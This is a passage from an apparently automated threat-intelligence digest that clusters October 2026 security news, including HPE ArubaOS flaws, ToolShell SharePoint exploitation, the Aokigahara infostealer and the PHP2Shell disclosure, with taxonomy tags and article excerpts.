Protocol of AOS-10 CVE-2026-79846 Unauthenticated Command Injection in AOS-8 CVE-2026-79847 Unauthenticated Buffer Overflow leads to RCE in AOS-10 CVE-2026-79848 Unauthenticated SQL Injection leading to RCE in AOS-8 CVE-2026-79849 Unauthenticated SQL Injection leading to RCE in AOS-8 CVE-2026-79850 Authentication Bypass leading to RCE in AOS-8 CVE-2026-79851 Unauthenticated Buffer Overflow leading to RCE in AOS-10 The company added that it has not yet found publicly available proof-of-concept exploit code or evidence that these vulnerabilities are being exploited in the wild. "HPE Networking is not aware of any public discussion or exploit code that targets the listed vulnerabilities as of the release date of this advisory," it said. In June 2025, HPE patched eight critical StoreOnce vulnerabilities that allowed authentication bypass and remote code execution and, one month later, warned of hardcoded credentials in Aruba Instant On Access Points that can let attackers bypass device authentication. In January 2025, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) also flagged a maximum-severity HPE OneView vulnerability as exploited in attacks. More recently, HPE warned of critical flaws allowing admin password resets and remote code execution on unpatched AOS-CX devices. HPE employs more than 61,000 people worldwide and provides services and products to over 55,000 enterprise customers worldwide, including 90% of Fortune 500 companies. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: HPE patches critical ArubaOS-CX remote code execution flaw GitLab warns of new max severity code execution vulnerability PHP ships emergency patches for critical PHP2Shell flaws F5 releases out-of-band patches for critical NGINX vulnerabilities Hackers exploit SiteGuard WAF flaw to run commands as admins
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: HPE patches eight max severity RCE and auth bypass AOS flaws
  - Published: 2026-10-23T12:48:00+00:00
  - Link: https://www.bleepingcomputer.com/news/security/hpe-patches-eight-max-severity-rce-and-auth-bypass-aos-flaws/
  - Summary: Hewlett Packard Enterprise (HPE) released security updates to patch 72 vulnerabilities in the Aruba Operating System (ArubaOS), including eight maximum-severity authentication bypass and code execution issues. [...]

### Cluster 7c42269e48 — score 13

- Title: ToolShell, SharePoint, and the Death of the Patch Window
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, zero_day
- actor_attribution: APT27, APT31
- affected_products: GitHub, Microsoft SharePoint
- cve_ids: CVE-2025-53770
- urgency_signals: no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, apt_espionage
- actor_attribution: APT27, APT31
- affected_products: Microsoft SharePoint, GitHub
- cve_ids: CVE-2025-53770
- urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
This blog explores this week's zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard.
```

#### Full body

```
Eli Woodward 3 min read July 8, 2025 ToolShell, SharePoint, and the Death of the Patch Window Introduction This week‚Äôs zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard. The exploit allowed unauthenticated remote code execution and quickly spread across unpatched SharePoint servers. Moreover, this incorporated a variant of previous vulnerabilities and resulted in the exploitation of an unpatched vulnerability. While this scenario is a security team‚Äôs nightmare (the mass exploitation of a zero-day), it does highlight a trend we‚Äôve been monitoring for several years - evidence of exploitation within Team Cymru‚Äôs data holdings prior to the availability of public exploit code. This type of insight is critical for defenders to be highly tuned into, because it demonstrates how fast and agile attackers have become and why they need to evolve their exposure discovery and related workflows to avert disaster. Old and busted: "Patch Within SLA." New paradigm: ‚ÄúPatch Now.‚Äù Our team has been studying how long it takes for exploit code to go from public release to real-world use. We track new PoC (proof-of-concept) exploit posts, then watch for signs of related activity in our data holdings. Our analysis found that, on average, exploitation tends to begin within three hours of public release. In some cases, we saw attacks begin before the PoC exploit code was even posted publicly. ToolShell was one of those cases. Source: https://github.com/soltanali0/CVE-2025-53770-Exploit/ ‚Äç Source: Pure Signal: Team Cymru Data We observed live exploitation on July 18th, 2025. The first case of PoC exploit code was not made public on GitHub until 21 July 2025. While this was a less common case of mass zero-day exploitation occurring, our data and tracking has shown organizations have mere hours in most cases to patch after exploit code becomes public. The Chinese Connection On 22 July 2025, the Microsoft Threat Intelligence team disclosed more details following their ongoing investigation into the ToolShell exploit campaign targeting on-premises SharePoint servers. Microsoft assesses that three China-nexus advanced persistent threat (APT) groups have been observed exploiting these vulnerabilities. This includes Linen Typhoon (also known as APT27 or Emissary Panda), Violet Typhoon (also known as APT31 or Judgement Panda), and a third group tracked as Storm-2603, which Microsoft also assesses to be a China-based adversary with medium confidence. The key takeaway from this pattern is that exploitation is now a collaborative and opportunistic process, not a linear one. Attackers don‚Äôt just wait for their zero-day to be discovered or for public proof-of-concept code to emerge‚Äîthey maximize the window of opportunity by sharing access and techniques within their circles as soon as they suspect the exploit will be exposed. We saw the same dynamic play out during the Hafnium Microsoft Exchange incident in 2021: once defenders started closing in, new intrusion sets appeared in our telemetry, evidence that the exploit was circulating between groups who wanted to extract every last bit of value before defenders could respond. ‚ÄúOur team sees this sequence repeat with almost every high-impact vulnerability‚Äîfirst a stealthy, targeted phase, then rapid escalation and mass exploitation as news breaks or defenders begin to mobilize.‚Äù ‚Äç Josh Hopkins, Team Cymru Threat Research team For defenders, this reality makes the old patching paradigm obsolete. If you‚Äôre waiting for public disclosure, scheduled patch windows, or even internal validation before acting, you are already behind the curve. The evidence shows that by the time an exploit is publicly known, your attack surface has likely already been tested‚Äîpossibly by multiple threat actors. Patching is not a box to tick off by next Friday. It‚Äôs a race against adversaries who move fast, share what works, and rarely give warning. The on
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: ToolShell, SharePoint, and the Death of the Patch Window
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
  - Summary: This blog explores this week's zero-day exploit targeting Microsoft SharePoint, now referred to as ToolShell, caught organizations off guard.

### Cluster ccd64df235 — score 13

- Title: Risky Bulletin: Linux patches PwnEscape KVM vulnerability
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-10-19T02:09:07+00:00
- Link: https://risky.biz/RBNEWS622/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: supply_chain
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
A serious vulnerability lets attackers escape Kernel-based virtual machines, OpenCode users become collateral damage in a distillation attack, supply chain incidents hit AOMEI and ConnectWise and Intel will discontinue SGX.
```

#### Full body

```
Risky Bulletin Podcast October 19, 2026 Risky Bulletin: Linux patches PwnEscape KVM vulnerability Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A serious vulnerability lets attackers escape Kernel-based virtual machines, OpenCode users become collateral damage in a distillation attack, supply chain incidents hit AOMEI and ConnectWise and Intel will discontinue SGX. Your browser does not support the audio element. Risky Bulletin: Linux patches PwnEscape KVM vulnerability â¶ 0:00 / 11:46 Subscribe Brought to you by Sondera Prove what your agents can't do. Then let them do more. Show notes Risky Bulletin: PwnEscape vulnerability lets you escape KVM
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Linux patches PwnEscape KVM vulnerability
  - Published: 2026-10-19T02:09:07+00:00
  - Link: https://risky.biz/RBNEWS622/
  - Summary: A serious vulnerability lets attackers escape Kernel-based virtual machines, OpenCode users become collateral damage in a distillation attack, supply chain incidents hit AOMEI and ConnectWise and Intel will discontinue SGX.

### Cluster 58360f97f3 — score 13

- Title: From Security Debt to Zero Criticals: AI Vulnerability Remediation with Orca MCP and Claude Code
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-10-20T17:17:46+00:00
- Link: https://orca.security/resources/blog/from-security-debt-to-zero-criticals-ai-vulnerability-remediation-with-orca-mcp-and-claude-code/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Anthropic/Claude

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: financial_services
- affected_products: Anthropic/Claude, Google/Gemini, OpenAI/ChatGPT
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: financial_services
- affected_products: Anthropic/Claude
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Security debt behaves like the financial kind. Nobody takes it on deliberately. It accrues one skipped base image bump at a time, and the interest shows up as a backlog no one owns. The pattern is familiar to anyone who has inherited a cloud estate. Hundreds of repos. A fleet of containers nobody fully owns. […]
```

#### Full body

```
Security debt behaves like the financial kind. Nobody takes it on deliberately. It accrues one skipped base image bump at a time, and the interest shows up as a backlog no one owns. The pattern is familiar to anyone who has inherited a cloud estate. Hundreds of repos. A fleet of containers nobody fully owns. A vulnerability backlog that earlier cleanup efforts never finished, because every time security handed engineering a list, engineering asked the same question: which of these actually matter? Then leadership sets a date. Every critical fixed by the end of the month. The security team that has to deliver is small, and the engineers who can fix things live in their own tools. Increasingly that tool is a coding agent that is already reading the repo and writing the diff. The last place they want to be is a security console, and nobody has patience for automation that creates work instead of removing it. Most tools promise a queue of tickets or auto-generated fix PRs waiting each morning. But can any tool hand the agent enough truth, and enough context, that an engineer would look at what came back and have the confidence to merge it? Here’s how one of our customers did it with Orca. Why coding agents can’t fix vulnerabilities safely on their own Give a coding agent a CVE ID and a repo and it will produce a plausible diff, but two things are missing. The first is ground truth. Which of the thousand findings is real, reachable, and running in production? Where does the vulnerable package actually live: pinned in a requirements.txt or package.json, installed by a RUN apt-get line in a Dockerfile, or inherited from a base image in the FROM line that nobody on the team builds? And which repo, out of hundreds, produced the container that is actually running? The agent can grep for a package name, but grepping across hundreds of repos is how you patch the wrong service. The second is guardrails. Left alone, an agent will happily bump a major version, swap a base image distro, or push to main because that resolved the finding fastest. Any one of those closes the alert but breaks the service. Both gaps come down to context and guardrails, and both are solvable today. The stack that solves them has three parts: Orca supplies the context Orca MCP Server delivers it to the coding agent A guided skill sets the guardrails What context Orca gives the coding agent A coding agent can read a repo. It cannot see what is running, what is exposed, or which image a container came from. That is what Orca contributes, and three pieces of it carry the fix. Code origin. Orca can trace dev risk to production by mapping a running workload back to the code that produced it: the Dockerfile that built the image, the Terraform that deployed the service, the Helm chart that configured it. Any one of those is enough to land the agent in the right repo. For a vulnerability, that is the difference between “there is a vulnerable OpenSSL somewhere in production” and “this Dockerfile, in this repo, line 3.” Package and image context. The alert carries the installed version, the fixed versions, and whether the issue is an OS package or an application dependency. That lets the skill pick the smallest patched version in the track already installed instead of guessing at a release that happens to be newer. Risk context. Exposure, attack path analysis , and whether the asset holds sensitive data. The agent doesn’t need this to write the fix. The engineer needs it to understand why this one is first, and the skill carries it into the PR description so the reviewer isn’t rebuilding the case from scratch. Without those three, the agent produces a diff. With them, it produces a diff an engineer can defend: the right repo, the right line, the smallest version that closes the finding, and the reason it was worth doing today. How the remediation skill works in Claude Code, step by step The engineer opens Claude Code with the Orca MCP connected and hands the skill an alert ID
```

#### Corroborating sources (2)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: From Security Debt to Zero Criticals: AI Vulnerability Remediation with Orca MCP and Claude Code
  - Published: 2026-10-20T17:17:46+00:00
  - Link: https://orca.security/resources/blog/from-security-debt-to-zero-criticals-ai-vulnerability-remediation-with-orca-mcp-and-claude-code/
  - Summary: Security debt behaves like the financial kind. Nobody takes it on deliberately. It accrues one skipped base image bump at a time, and the interest shows up as a backlog no one owns. The pattern is familiar to anyone who has inherited a cloud estate. Hundreds of repos. A fleet of containers nobody fully owns. […]
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: OpenCode Breach Could Affect OpenAI, Anthropic and Google
  - Published: 2026-10-19T13:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/opencode-breach-openai-anthropic/
  - Summary: A breach affecting the OpenCode Console may lead to the exposure of API keys for Anthropic, OpenAI and Google Gemini users

### Cluster 291b7cae3e — score 12

- Title: Infostealer riding the AI Train
- Source: Check Point Research (threat_research_primary)
- Published: 2026-10-23T13:00:09+00:00
- Link: https://research.checkpoint.com/2026/infostealer-riding-the-ai-train/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, ransomware_extortion
- affected_industries: financial_services
- affected_products: Android, Google Cloud, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft, active_exploitation
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT, Google Cloud
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Key Points Introduction Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments. This expanded targeting reflects […] The post Infostealer riding the AI Train appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 22 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 476 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 430 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Infostealer riding the AI Train October 23, 2026 https://research.checkpoint.com/2026/infostealer-riding-the-ai-train/ Key Points Aokigahara , a newly observed infostealer, has been spotted in the wild. An earlier version may have been known as Kamidere or Stygian . The malware includes traditional data theft capabilities targeting browsers, VPN clients, cryptocurrency wallets, FTP/SFTP clients, password managers, and email applications, among other targets. AI applications and development tools are notable targets. The stealer collects authentication files, session data, and configuration files associated with Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, and other tools. Stolen AI credentials could offer opportunities for monetization. Usable credentials or session tokens could enable unauthorized access to paid AI services or the resale of compromised accounts. Its collection scope extends to developer and cloud environments. Targets include Git credential files, SSH private keys, and AWS, Azure, and Google Cloud credential and configuration files. Introduction Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments. This expanded targeting reflects a broader shift in what attackers may consider valuable, not only personal accounts and financial data, but also access to AI services and the environments developers use to build software. Valid credentials or session tokens could expose private conversations and development data, enable unauthorized use of paid services, or potentially be sold to provide access to compromised AI accounts. While the malware’s collection routines support these possibilities, the analysis does not confirm how its operators monetize the stolen data. Stealer Capabilities and Targeted Applications The Aokigahara infostealer includes common information-stealing capabilities, such as screenshot capture, clipboard collection, browser credential and cookie theft, cryptocurrency wallet data collection, and file grabbing. It also includes a clipper handler that drops a separate component for clipboard manipulation. The malware targets Chromium-based browsers and Mozilla Firefox, desktop cryptocurrency wallets and browser wallet extensions, messaging applications such as Discord and Telegram, and gaming platforms such as Steam, Roblox, and Minecraft. Additional targets include password managers, VPN clients, FTP/SFTP clients, email applications, and AI development tools. The table below summarizes each handler, its targets, and any limitations identified during the analysis. The table below lists the malware’s main capabilities and their corresponding internal function names. Function What the handler targets sysinfo The machine and current user: computer/user names, IP, Windows version, CPU/RAM, screen size, language, uptime, running processes, environment variables, installed software, and detected antivirus. screenshot Captures the screen as Screenshot.jpg . clipboard Captures clipboard contents into Clipboard.txt . browsers Chromium-based browser profiles. The embedded paths name Chrome (including Beta/Canary), Edge (including Beta/Dev/Canary), Brave, Opera, Vivaldi, Yandex, 360Chrome, CentBrowser, CocCoc, Comodo Dragon, Epic Privacy Browser, Iridium, Tor
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: Infostealer riding the AI Train
  - Published: 2026-10-23T13:00:09+00:00
  - Link: https://research.checkpoint.com/2026/infostealer-riding-the-ai-train/
  - Summary: Key Points Introduction Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments. This expanded targeting reflects […] The post Infostealer riding the AI Train appeared first on Check Point Research .

### Cluster ef02f219bd — score 12

- Title: Orphaned VBA Projects Inside DWG Files: YARA Rule, (Sun, Oct 18th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-18T12:59:30+00:00
- Link: https://isc.sans.edu/diary/rss/33434
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
Here is the YARA rule I used to detect " Orphaned VBA Projects Inside DWG Files ".
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: Orphaned VBA Projects Inside DWG Files: YARA Rule, (Sun, Oct 18th)
  - Published: 2026-10-18T12:59:30+00:00
  - Link: https://isc.sans.edu/diary/rss/33434
  - Summary: Here is the YARA rule I used to detect " Orphaned VBA Projects Inside DWG Files ".

### Cluster 5f2d69d128 — score 12

- Title: PHP2Shell: AI uncovers critical RCE vulnerabilities affecting 70% of the Internet
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-10-21T13:59:59+00:00
- Link: https://www.wiz.io/blog/php2shell-php-rce
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: AWS, Drupal, OpenAI/ChatGPT
- urgency_signals: critical_cvss, preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT, Drupal, AWS
- urgency_signals: preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Core PHP engine flaws enable remote code execution and Heartbleed-style memory disclosure across the web.
```

#### Full body

```
Executive Summary Wiz Research uncovered multiple critical vulnerabilities in core PHP, a popular general-purpose scripting language that powers 70% of all websites in the world. Successful exploitation could allow attackers to take control of affected servers, steal sensitive data, and deface the websites running on them. PHP is a backbone of the web: it’s the programming language powering WordPress, Joomla, Drupal, Wikipedia’s MediaWiki, and many others. These vulnerabilities include memory disclosure and unauthenticated remote code execution in PHP itself, independent of the application running on top of it , putting every affected website in immediate risk. Every PHP version released in the last decade is affected by at least one of these vulnerabilities, going back to version 5.4. Attackers can exploit them remotely, in some cases fairly easily. Immediate patching is strongly advised. On October 21, 2026, PHP released the patch fixing multiple memory-safety vulnerabilities in the core engine. These findings rank among the most severe vulnerabilities discovered in PHP, and arguably in software history. The underlying flaws had been present for decades, but demonstrating their exploitability required an exceptionally complex chain of steps, at the edge of what human researchers could practically achieve. Frontier AI models substantially reduced that barrier, turning a longstanding flaw into an exploit. Overview In this post, we explain how frontier AI helped us find and fix vulnerabilities that had remained hidden in the PHP codebase for more than a decade. The issues described below all stem from key architecture decisions, some made over a decade ago, and were grouped under two CVEs, with severity reaching CVSS 9.2. The work grew into a cross-industry effort to protect customers, find variants, deploy detections and mitigations, and verify a patch in time for coordinated disclosure. Nearly every PHP version is affected by at least one of these issues, including releases dating back to PHP 5.4. The vulnerabilities can allow unauthenticated attackers to execute code on affected servers or read sensitive process memory. That memory may contain passwords, authentication tokens, API keys and certificates belonging to other requests or the server itself. PHP is the programming language behind much of the web, powering WordPress, Drupal and MediaWiki, the software that runs Wikipedia. A flaw in its core engine can affect websites across this ecosystem, even when their own application code is secure. Some vulnerabilities become turning points because they challenge fundamental assumptions about security. In 2014, Heartbleed exposed the fragility of shared infrastructure securing the internet. In 2021, Log4Shell revealed how deeply embedded software dependencies could create widespread exposure that organizations struggled to identify. We believe PHP2Shell could mark a similar turning point for the AI era, illustrating how AI can change the practical exploitability of longstanding vulnerabilities. Building the exploit required chaining multiple flaws and adapting to each target’s memory layout through repeated testing and debugging. Frontier models were critical to making this process practical, enabling us to develop and adapt working exploits across multiple applications in hours. As the time and expertise required for this work decrease, complexity may no longer provide a meaningful barrier, changing how we define what is vulnerable in practice. Wiz Research would like to thank the PHP team, Calif and OpenAI for their work on discovery, coordination and patch verification. OpenAI and Calif also published blogs containing details on the vulnerability – its history, technical details, and insight into the disclosure process. PHP posted as well. We’d also like to express our sincere gratitude towards Automattic, Akamai, AWS, Cloudflare , Fastly , Google , Imperva, Microsoft, Vercel , and many others, for helping prepare guidance a
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: PHP2Shell: AI uncovers critical RCE vulnerabilities affecting 70% of the Internet
  - Published: 2026-10-21T13:59:59+00:00
  - Link: https://www.wiz.io/blog/php2shell-php-rce
  - Summary: Core PHP engine flaws enable remote code execution and Heartbleed-style memory disclosure across the web.

### Cluster 4ff2661d4c — score 12

- Title: Supply Chain & CTI
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/supply-chain-cti
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- affected_industries: government
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- affected_industries: government
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
This blog explores how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk.
```

#### Full body

```
Will Thomas 5 min read July 8, 2025 Supply Chain & CTI Why expanding third party risks is no longer a luxury In this blog, we‚Äôll explore how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk. Across the globe, many new laws like DORA in the EU and CMMC in the US have been implemented, driving the need to not just reactively engage with your supply chain, but proactively collaborate and monitor third-party infrastructure for signals of compromise. The underlying intention is that the ecosystem you are part of is more robust when working together. These regulations are likely to be adopted by many other industries, making this blog worthwhile reading for security teams of all sizes and sectors. Reactive supply chain management typically involves sending Supplier Assurance Questionnaires (SAQs) to suppliers after a confirmed breach has occurred, often by the time it makes the news. Many large organizations have taken the initiative to leverage threat intelligence services that support checking for brand name keywords or domains appearing on ransomware data leak sites, cybercrime forum posts, or darkweb credential markets. An even more proactive measure that could be taken to manage supply chain risks involves using passive scanning services to check for unpatched vulnerabilities in supply chain networks, as well as using NetFlow data to detect malicious command-and-control (C2) communications originating from supplier environments. Key Findings Technology leaders are issuing warnings to their supply chain to modernise their cybersecurity practices Governments are introducing more legislation to protect digital services and critical sectors from supply chain risks More organizations need to incorporate proactive threat intelligence to evaluate supply chain vendors Netflow data presents itself as a useful alternative method for organizations to validate supply chain ecosystems. Supply Chain Management Many organizations start by prioritising who their supply chain vendors are and create a criteria based on several factors, such as the impact to business operations if they were attacked, or the sensitivity of the data they process or store for them. Other factors that come into play are whether the supply chain vendors have direct network access into the organization‚Äôs environment, and which environments those are as well. One of the challenging aspects for CTI teams doing this type of work is figuring all these things out for a large number of suppliers. Fortune 500 organizations will often have upwards of 5,000 suppliers, in many cases from around the world. Working out these factors for every supplier to rank and prioritise them is difficult on its own. This type of information is often only available in contracts possessed by the procurement or law departments and may be vague and obscure. Getting a handle on which suppliers have direct network access to your organization‚Äôs environment is often made a priority due to the implications of a software supply chain attack or identity-based network intrusion. Without network-level visibility to know where cyber threats can arrive from, the chances of detecting an intrusion are severely diminished. In other cases, knowing which suppliers handle the most sensitive information about your organization is also crucial to understanding your expanded attack surface that extends to third parties. Supply chain partners such as law firms will often hold highly sensitive information for their clients, making them ideal targets for persistent adversaries willing to put in the work to get in. Defining Cyber Threat Intelligence Team Capabilities Before we detail the sources of CTI, let‚Äôs explore the nuances that will enable you to align with your existing teams and capabilities. First on the maturity ladder from a CTI perspective is supporting Incident Response operations, which can include Reactive Threat Hunting operations. At this stage, many CTI
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Supply Chain & CTI
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/supply-chain-cti
  - Summary: This blog explores how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk.

### Cluster bd4fb91f5d — score 12

- Title: Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-19T14:07:29+00:00
- Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-elite-threat-hunters-prevent-supply-chain-breaches
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- affected_industries: financial_services, legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- affected_industries: financial_services, legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how elite threat hunters and Pure Signal Recon help CISOs prevent supply chain breaches, save millions, and boost security ROI. Learn more.
```

#### Full body

```
tcblogposts min read March 13, 2024 Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches Up the Ante Against Supply Chain Attacks and Still Have Time to Save the World Introduction In our first post we talked about how external threat hunting with Pure Signal Recon can have a direct financial savings in terms of reducing the cost of a data breach and minimizing risk. In our second blog post we talked about how most organizations need fewer cyber threat intelligence sources than they subscribe to, it‚Äôs a good place to realize some tactical yet meaningful budget savings. Based on feedback from our Fortune 10 client, we also explored how too many CTI sources can detract from your external threat hunting program if the curated data isn‚Äôt relevant or timely. Let‚Äôs discuss the impact Pure Signal Recon had on this Fortune 10 security organization to help them better identify security gaps and confirmed threats originating from their supply chain. Additional visibility and leveraging the right CTI data reduced the cost of compromise, with use cases such as: Early identification of compromised third parties Shut down of threat actor Command & Control (C2) communications in real-time Blocking 24 of 30 significant events with third parties.* Notifying an additional 300 compromised organizations and provided enough information to prevent or minimize damage Raising the cost to attack - Continually forced bad actors to retool their infrastructure ‚ÄúIn the beginning of 2020, we saw a major increase in ransomware hitting our third parties. If they are compromised in any way, shape, or form, then our IR and legal teams become actively involved. They make sure that no data related to us is leaked, that [the third party‚Äôs] network is secure, and that [the third party] won‚Äôt be used as a pivot to get into our networks. There‚Äôs a time-consuming process that comes with a compromise of our third parties.‚Äù Lead security analyst In addition, their supply chain threat hunting and monitoring efforts earned a projected cost reduction of $1,3M of net present value savings over three years. A Mile Long Supply Chain Requires Significant Expertise to Secure This Fortune 10 multinational national retailer has a supply chain that is expansive as it varied. While there is no doubt their supply chain serves as a strategic advantage; it can also be used as another attack vector to compromise vulnerable core applications and security gaps in infrastructure. This is no surprise considering 98% of organizations have a relationship with at least one third party that has experienced a breach in the last two years.1 Every compromised supply chain partner incident has a significant cost in terms of cybersecurity, legal and potentially PR expertise to respond to an event, depending how far reaching the breach, and how well recognized your brand. Time is crucial to ensuring a third-party breach can‚Äôt be used to pivot into core systems. The legal & PR teams get involved to minimize the possibility of negative press and customer notification mandates. ‚ÄúWith Recon, we map the infrastructure being used by some ransomware groups. We block them from entering our network, monitor their infrastructures as they evolve, and monitor potential victims such as third-party entities. When [a third party is] compromised, we identify it with Recon, then tell [the third party] how [the threat actor] got in ... and what they need to do to stop them immediately.‚Äù Lead security analyst The case study organization typically requires at least 15 FTE security analysts or legal professionals working three days each when a partner is compromised. Using Pure Signal Recon , they were able to block 24 of 30 significant events with a third party. Using a simple formula of $75 per hour for each FTE multiplied by 3 days each, it is easy to see how the cost of responding to supply chain compromises adds up. High-risk third-party threat events whe
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches
  - Published: 2026-10-19T14:07:29+00:00
  - Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-elite-threat-hunters-prevent-supply-chain-breaches
  - Summary: Discover how elite threat hunters and Pure Signal Recon help CISOs prevent supply chain breaches, save millions, and boost security ROI. Learn more.

### Cluster f320a38d8c — score 12

- Title: Someone Tried to Exploit PHP2Shell 4 Days Before the Vulnerabilities Were Publicly Disclosed
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-22T06:34:10+00:00
- Link: https://thehackernews.com/2026/10/someone-tried-to-exploit-php2shell-4.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: OpenAI/ChatGPT
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-115560
- urgency_signals: actively_exploited, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: OpenAI/ChatGPT
